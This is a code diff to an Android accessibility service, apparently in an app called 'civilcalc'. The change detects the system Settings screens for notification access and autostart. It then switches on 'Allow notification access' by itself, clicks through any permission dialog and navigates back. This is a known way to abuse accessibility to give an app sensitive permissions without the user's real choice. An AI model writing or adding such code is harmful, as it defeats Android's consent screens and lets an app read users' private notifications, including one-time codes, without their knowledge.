@@ -322,14 +322,27 @@ class BlockAccessibilityService : AccessibilityService() {
         val pkg = (root.packageName ?: "").toString().lowercase()
         if (pkg == applicationContext.packageName.lowercase()) return false
 
-        // In pure com.android.settings, never treat Accessibility settings screen as Autostart
+        // In pure com.android.settings:
         if (pkg == "com.android.settings") {
             try {
+                // If it's accessibility settings itself, do not handle as autostart
                 val isA11y = !root.findAccessibilityNodeInfosByText("Accessibility").isNullOrEmpty() ||
                         !root.findAccessibilityNodeInfosByText("Downloaded apps").isNullOrEmpty() ||
                         !root.findAccessibilityNodeInfosByText("Installed services").isNullOrEmpty() ||
                         !root.findAccessibilityNodeInfosByText("use civilcalc").isNullOrEmpty()
                 if (isA11y) return false
+
+                // Notification Access ("Device & app notifications")
+                val isNotifAccess = !root.findAccessibilityNodeInfosByText("Notification access").isNullOrEmpty() ||
+                        !root.findAccessibilityNodeInfosByText("Device & app notifications").isNullOrEmpty() ||
+                        !root.findAccessibilityNodeInfosByText("Allow notification access").isNullOrEmpty()
+                if (isNotifAccess) return true
+
+                // App Info screen (contains Autostart, Battery saver, Permissions)
+                val isAppInfo = !root.findAccessibilityNodeInfosByText("App info").isNullOrEmpty() ||
+                        !root.findAccessibilityNodeInfosByText("Autostart").isNullOrEmpty() ||
+                        !root.findAccessibilityNodeInfosByText("Auto-start").isNullOrEmpty()
+                if (isAppInfo) return true
 
                 val isBattery = !root.findAccessibilityNodeInfosByText("No restrictions").isNullOrEmpty() ||
                         !root.findAccessibilityNodeInfosByText("Battery optimization").isNullOrEmpty() ||
@@ -377,9 +390,27 @@ class BlockAccessibilityService : AccessibilityService() {
                             lastAutostartToggleTime = now
                             Handler(Looper.getMainLooper()).postDelayed({
                                 performGlobalAction(GLOBAL_ACTION_BACK)
-                            }, 1000L)
+                            }, 500L)
                             return true
                         }
+                    }
+                }
+            }
+
+            // 0.1 Check for "Allow notification access" switch in Notification Listener screen
+            val notifSwitches = root.findAccessibilityNodeInfosByText("Allow notification access")
+            if (!notifSwitches.isNullOrEmpty()) {
+                for (node in notifSwitches) {
+                    if (findAndClickSwitchNearNode(node)) {
+                        lastAutostartToggleTime = now
+                        Log.i("BlockA11y", "Auto-toggled 'Allow notification access' switch")
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            clickAnyPermissionDialog()
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                performGlobalAction(GLOBAL_ACTION_BACK)
+                            }, 500L)
+                        }, 500L)
+                        return true
                     }
                 }
             }
